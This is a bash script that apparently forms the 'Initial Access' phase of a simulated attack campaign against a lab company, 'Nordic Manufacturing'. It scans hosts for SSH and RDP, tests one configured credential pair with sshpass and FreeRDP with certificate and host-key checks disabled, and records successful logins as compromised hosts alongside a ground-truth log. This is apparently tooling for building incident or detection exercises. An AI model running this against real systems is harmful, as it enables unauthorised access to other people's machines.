#!/usr/bin/env bash

set -u


# ============================================================
# Nordic Manufacturing A/S
# H3 Incident Campaign V2
#
# Phase 03 - Initial Access
#
# Linux:
#   SSH discovery + credential validation
#
# Windows:
#   RDP discovery + credential validation
#
# Input:
#   state/discovered-hosts.json
#
# Output:
#   state/compromised-hosts.json
#
# A host is ONLY marked compromised when the configured
# credentials successfully authenticate.
# ============================================================


# ============================================================
# PATHS / CONFIG
# ============================================================

BASE_DIR="/opt/nordic-attack"
CONFIG_FILE="$BASE_DIR/config/defaults.conf"

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found:"
    echo "$CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"

mkdir -p \
    "$NORDIC_STATE_DIR" \
    "$NORDIC_LOG_DIR"


# ============================================================
# CAMPAIGN CONFIGURATION
# ============================================================

INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"


# ------------------------------------------------------------
# Linux / SSH
# ------------------------------------------------------------

SSH_USER="${
    NORDIC_SSH_USERNAME:-${
        NORDIC_SSH_USER:-$NORDIC_DEFAULT_SSH_USER
    }
}"

SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"
SSH_PORT="${NORDIC_SSH_PORT:-$NORDIC_DEFAULT_SSH_PORT}"


# ------------------------------------------------------------
# Windows / RDP
# ------------------------------------------------------------

RDP_USER="${NORDIC_RDP_USERNAME:-$NORDIC_DEFAULT_RDP_USER}"
RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-$NORDIC_DEFAULT_RDP_PASSWORD}"
RDP_PORT="${NORDIC_RDP_PORT:-$NORDIC_DEFAULT_RDP_PORT}"


DISCOVERED_STATE="$NORDIC_DISCOVERED_STATE"
COMPROMISED_STATE="$NORDIC_COMPROMISED_STATE"

LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-03-access.log"


# ============================================================
# FUNCTIONS
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    printf '%s INCIDENT=%s PHASE=03 %s\n' \
        "$(date --iso-8601=seconds)" \
        "$INCIDENT_ID" \
        "$MESSAGE" \
        >> "$NORDIC_GROUND_TRUTH_LOG"
}


valid_port() {

    local PORT="$1"

    [[ "$PORT" =~ ^[0-9]+$ ]] || return 1

    (( PORT >= 1 && PORT <= 65535 ))
}


tcp_open() {

    local HOST="$1"
    local PORT="$2"

    timeout "$NORDIC_CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 timeout sshpass ssh; do

    if ! command -v "$CMD" >/dev/null 2>&1; then

        echo "[ERROR] Required command not found: $CMD"

        if [[ "$CMD" == "sshpass" ]]; then
            echo
            echo "Package required:"
            echo "  sshpass"
        fi

        exit 1
    fi

done


# ============================================================
# RDP AUTHENTICATION TOOL
# ============================================================
#
# We use FreeRDP auth-only mode.
#
# Supported binary names:
#
#   xfreerdp3
#   xfreerdp
#
# No desktop session is opened.
# ============================================================

RDP_CLIENT=""

if command -v xfreerdp3 >/dev/null 2>&1; then

    RDP_CLIENT="$(command -v xfreerdp3)"

elif command -v xfreerdp >/dev/null 2>&1; then

    RDP_CLIENT="$(command -v xfreerdp)"

fi


# ============================================================
# VALIDATION
# ============================================================

if [[ ! -f "$DISCOVERED_STATE" ]]; then

    echo "[ERROR] Phase 01 inventory not found:"
    echo "$DISCOVERED_STATE"
    echo
    echo "Run Phase 01 first."

    exit 1
fi


if [[ -z "$SSH_USER" ]]; then

    echo "[ERROR] Linux SSH username is missing."
    exit 1
fi


if [[ -z "$SSH_PASSWORD" ]]; then

    echo "[ERROR] Linux SSH password is missing."
    exit 1
fi


if ! valid_port "$SSH_PORT"; then

    echo "[ERROR] Invalid SSH port:"
    echo "$SSH_PORT"

    exit 1
fi


if [[ -z "$RDP_USER" ]]; then

    echo "[ERROR] Windows RDP username is missing."
    exit 1
fi


if [[ -z "$RDP_PASSWORD" ]]; then

    echo "[ERROR] Windows RDP password is missing."
    exit 1
fi


if ! valid_port "$RDP_PORT"; then

    echo "[ERROR] Invalid RDP port:"
    echo "$RDP_PORT"

    exit 1
fi


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo " NORDIC MANUFACTURING"
echo " H3 INCIDENT CAMPAIGN V2"
echo " PHASE 03 - INITIAL ACCESS"
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"

log "[*] Linux / SSH:"
log "    Username: $SSH_USER"
log "    Port:     $SSH_PORT"

log "[*] Windows / RDP:"
log "    Username: $RDP_USER"
log "    Port:     $RDP_PORT"

# Passwords are deliberately NEVER logged.

if [[ -n "$RDP_CLIENT" ]]; then
    log "[*] RDP authentication client: $(basename "$RDP_CLIENT")"
else
    log "[!] FreeRDP client not installed."
    log "[!] RDP services will be discovered but authentication cannot be tested."
fi

echo


# ============================================================
# LOAD DISCOVERED HOSTS
# ============================================================

mapfile -t HOSTS < <(

    python3 - "$DISCOVERED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = json.load(f)

for host in data.get("hosts", []):
    ip = host.get("ip")

    if ip:
        print(ip)
PY

)


log "[*] Hosts supplied by Phase 01: ${#HOSTS[@]}"

echo


# ============================================================
# TEMPORARY RESULTS
# ============================================================

TMP_RESULTS="$NORDIC_STATE_DIR/.compromised-hosts.tmp"

: > "$TMP_RESULTS"


SSH_FOUND=0
SSH_LOGIN_SUCCESS=0
SSH_LOGIN_FAILED=0

RDP_FOUND=0
RDP_LOGIN_SUCCESS=0
RDP_LOGIN_FAILED=0
RDP_LOGIN_SKIPPED=0


# ============================================================
# DISCOVERY + AUTHENTICATION
# ============================================================

for HOST in "${HOSTS[@]}"; do

    echo
    echo "------------------------------------------------------------"
    echo " Host: $HOST"
    echo "------------------------------------------------------------"
    echo


    # ========================================================
    # LINUX / SSH
    # ========================================================

    if tcp_open "$HOST" "$SSH_PORT"; then

        SSH_FOUND=$(( SSH_FOUND + 1 ))

        log "[+] SSH candidate: $HOST:$SSH_PORT"

        ground_truth \
            "SSH_DISCOVERED ip=$HOST port=$SSH_PORT"


        # ----------------------------------------------------
        # Attempt exactly one configured credential pair.
        #
        # No brute force.
        # No credential list.
        # ----------------------------------------------------

        SSH_OUTPUT="$(
            sshpass -p "$SSH_PASSWORD" \
            ssh \
                -p "$SSH_PORT" \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
                -o PreferredAuthentications=password \
                -o PubkeyAuthentication=no \
                -o NumberOfPasswordPrompts=1 \
                "$SSH_USER@$HOST" \
                'printf "NORDIC_ACCESS_OK\n"; uname -s 2>/dev/null || true; hostname 2>/dev/null || true' \
                2>/dev/null
        )"

        SSH_RESULT=$?


        if [[ $SSH_RESULT -eq 0 ]] &&
           grep -q '^NORDIC_ACCESS_OK$' <<< "$SSH_OUTPUT"; then

            SSH_LOGIN_SUCCESS=$(( SSH_LOGIN_SUCCESS + 1 ))

            OS="$(
                printf '%s\n' "$SSH_OUTPUT" |
                sed -n '2p'
            )"

            HOSTNAME="$(
                printf '%s\n' "$SSH_OUTPUT" |
                sed -n '3p'
            )"


            log "[COMPROMISED][LINUX] $HOST"

            if [[ -n "$HOSTNAME" ]]; then
                log "                     Hostname: $HOSTNAME"
            fi

            if [[ -n "$OS" ]]; then
                log "                     OS: $OS"
            fi


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "linux" \
                "ssh" \
                "$SSH_PORT" \
                "$SSH_USER" \
                "$HOSTNAME" \
                "$OS" \
                >> "$TMP_RESULTS"


            ground_truth \
                "ACCESS_SUCCESS platform=linux access=ssh ip=$HOST port=$SSH_PORT user=$SSH_USER hostname=$HOSTNAME os=$OS"

        else

            SSH_LOGIN_FAILED=$(( SSH_LOGIN_FAILED + 1 ))

            log "[FAILED][SSH] Authentication failed: $HOST"

            ground_truth \
                "ACCESS_FAILED platform=linux access=ssh ip=$HOST port=$SSH_PORT user=$SSH_USER"

        fi

    else

        log "[-] SSH port closed/unreachable: $HOST:$SSH_PORT"

    fi


    # ========================================================
    # WINDOWS / RDP
    # ========================================================

    if tcp_open "$HOST" "$RDP_PORT"; then

        RDP_FOUND=$(( RDP_FOUND + 1 ))

        log "[+] RDP candidate: $HOST:$RDP_PORT"

        ground_truth \
            "RDP_DISCOVERED ip=$HOST port=$RDP_PORT"


        # ----------------------------------------------------
        # FreeRDP is not available.
        #
        # Discovery is retained, but the host MUST NOT be
        # marked compromised without successful auth.
        # ----------------------------------------------------

        if [[ -z "$RDP_CLIENT" ]]; then

            RDP_LOGIN_SKIPPED=$(( RDP_LOGIN_SKIPPED + 1 ))

            log "[SKIPPED][RDP] Authentication client unavailable: $HOST"

            ground_truth \
                "RDP_AUTH_SKIPPED ip=$HOST port=$RDP_PORT reason=client_unavailable"

            continue
        fi


        # ----------------------------------------------------
        # Validate one configured RDP credential pair.
        #
        # /auth-only means:
        #   authenticate only
        #   do not open an interactive desktop
        #
        # /cert:ignore prevents the lab certificate from
        # blocking authentication.
        #
        # Password is passed as an argument but is NEVER
        # written to our logs/state.
        # ----------------------------------------------------

        RDP_OUTPUT="$(
            timeout "$NORDIC_RDP_TIMEOUT" \
                "$RDP_CLIENT" \
                    /v:"$HOST:$RDP_PORT" \
                    /u:"$RDP_USER" \
                    /p:"$RDP_PASSWORD" \
                    /auth-only \
                    /cert:ignore \
                    /log-level:ERROR \
                    2>&1
        )"

        RDP_RESULT=$?


        # ----------------------------------------------------
        # FreeRDP versions vary slightly in output.
        #
        # Exit code 0 is the primary success condition.
        # We additionally reject known authentication errors.
        # ----------------------------------------------------

        if [[ $RDP_RESULT -eq 0 ]] &&
           ! grep -Eqi \
               'ERRCONNECT_LOGON_FAILURE|STATUS_LOGON_FAILURE|authentication failure|logon failure' \
               <<< "$RDP_OUTPUT"; then

            RDP_LOGIN_SUCCESS=$(( RDP_LOGIN_SUCCESS + 1 ))


            log "[COMPROMISED][WINDOWS] $HOST"
            log "                       Access: RDP"
            log "                       User:   $RDP_USER"


            printf '%s|%s|%s|%s|%s|%s|%s\n' \
                "$HOST" \
                "windows" \
                "rdp" \
                "$RDP_PORT" \
                "$RDP_USER" \
                "" \
                "Windows" \
                >> "$TMP_RESULTS"


            ground_truth \
                "ACCESS_SUCCESS platform=windows access=rdp ip=$HOST port=$RDP_PORT user=$RDP_USER"

        else

            RDP_LOGIN_FAILED=$(( RDP_LOGIN_FAILED + 1 ))

            log "[FAILED][RDP] Authentication failed: $HOST"

            ground_truth \
                "ACCESS_FAILED platform=windows access=rdp ip=$HOST port=$RDP_PORT user=$RDP_USER"

        fi

    else

        log "[-] RDP port closed/unreachable: $HOST:$RDP_PORT"

    fi

done


# ============================================================
# CREATE compromised-hosts.json
# ============================================================

python3 - \
    "$TMP_RESULTS" \
    "$COMPROMISED_STATE" \
    "$INCIDENT_ID" <<'PY'

import json
import sys
from datetime import datetime, timezone


source_file = sys.argv[1]
output_file = sys.argv[2]
incident_id = sys.argv[3]

hosts = []


with open(source_file, "r", encoding="utf-8") as f:

    for line in f:

        line = line.rstrip("\n")

        if not line:
            continue

        (
            ip,
            platform,
            access,
            port,
            user,
            hostname,
            os_name,
        ) = line.split("|", 6)


        host = {
            "ip": ip,
            "platform": platform,
            "access": access,
            "authenticated": True,
            "compromised": True,
            "hostname": hostname,
            "os": os_name,
        }


        if access == "ssh":

            host["ssh_port"] = int(port)
            host["ssh_user"] = user
            host["ssh_username"] = user


        elif access == "rdp":

            host["rdp_port"] = int(port)
            host["rdp_user"] = user
            host["rdp_username"] = user


        hosts.append(host)


data = {
    "incident_id": incident_id,
    "generated": datetime.now(
        timezone.utc
    ).isoformat(),
    "count": len(hosts),
    "hosts": hosts,
}


with open(output_file, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)

PY


rm -f "$TMP_RESULTS"


# ============================================================
# UPDATE CENTRAL INVENTORY
# ============================================================

python3 - \
    "$DISCOVERED_STATE" \
    "$COMPROMISED_STATE" \
    "$SSH_PORT" \
    "$RDP_PORT" <<'PY'

import json
import sys


inventory_file = sys.argv[1]
compromised_file = sys.argv[2]

ssh_port = int(sys.argv[3])
rdp_port = int(sys.argv[4])


with open(inventory_file, "r", encoding="utf-8") as f:
    inventory = json.load(f)


with open(compromised_file, "r", encoding="utf-8") as f:
    compromised = json.load(f)


compromised_by_ip = {
    host["ip"]: host
    for host in compromised.get("hosts", [])
}


for host in inventory.get("hosts", []):

    ip = host.get("ip")

    services = host.setdefault(
        "services",
        {}
    )


    if ip in compromised_by_ip:

        result = compromised_by_ip[ip]

        platform = result.get(
            "platform",
            ""
        )

        access = result.get(
            "access",
            ""
        )


        host["compromised"] = True
        host["status"] = "compromised"
        host["platform"] = platform
        host["access"] = access


        # ----------------------------------------------------
        # Linux
        # ----------------------------------------------------

        if access == "ssh":

            host["ssh_candidate"] = True

            services["ssh"] = {
                "port": ssh_port,
                "authenticated": True,
                "user": result.get(
                    "ssh_username",
                    result.get(
                        "ssh_user",
                        ""
                    )
                ),
            }


        # ----------------------------------------------------
        # Windows
        # ----------------------------------------------------

        elif access == "rdp":

            host["rdp_candidate"] = True

            services["rdp"] = {
                "port": rdp_port,
                "authenticated": True,
                "user": result.get(
                    "rdp_username",
                    result.get(
                        "rdp_user",
                        ""
                    )
                ),
            }


        if result.get("hostname"):

            host["hostname"] = result.get(
                "hostname",
                ""
            )


        if result.get("os"):

            host["os"] = result.get(
                "os",
                ""
            )


    else:

        host.setdefault(
            "compromised",
            False
        )


with open(inventory_file, "w", encoding="utf-8") as f:
    json.dump(inventory, f, indent=2)

PY


# ============================================================
# SUMMARY
# ============================================================

TOTAL_COMPROMISED=$(
    python3 - "$COMPROMISED_STATE" <<'PY'
import json
import sys

with open(sys.argv[1], "r", encoding="utf-8") as f:
    data = json.load(f)

print(len(data.get("hosts", [])))
PY
)


echo
echo "============================================================"
echo " PHASE 03 COMPLETED"
echo "============================================================"
echo

echo "Discovered hosts checked:"
echo "  ${#HOSTS[@]}"

echo

echo "Linux / SSH"
echo "-----------"

echo "SSH services found:"
echo "  $SSH_FOUND"

echo

echo "Successful SSH access:"
echo "  $SSH_LOGIN_SUCCESS"

echo

echo "Failed SSH authentication:"
echo "  $SSH_LOGIN_FAILED"

echo

echo "Windows / RDP"
echo "-------------"

echo "RDP services found:"
echo "  $RDP_FOUND"

echo

echo "Successful RDP access:"
echo "  $RDP_LOGIN_SUCCESS"

echo

echo "Failed RDP authentication:"
echo "  $RDP_LOGIN_FAILED"

echo

echo "RDP authentication skipped:"
echo "  $RDP_LOGIN_SKIPPED"

echo

echo "Total compromised hosts:"
echo "  $TOTAL_COMPROMISED"

echo

echo "Compromised host inventory:"
echo "  $COMPROMISED_STATE"

echo

echo "Log:"
echo "  $LOG_FILE"

echo


ground_truth \
    "PHASE_COMPLETE ssh_found=$SSH_FOUND ssh_compromised=$SSH_LOGIN_SUCCESS ssh_failed=$SSH_LOGIN_FAILED rdp_found=$RDP_FOUND rdp_compromised=$RDP_LOGIN_SUCCESS rdp_failed=$RDP_LOGIN_FAILED rdp_skipped=$RDP_LOGIN_SKIPPED compromised_total=$TOTAL_COMPROMISED"


exit 0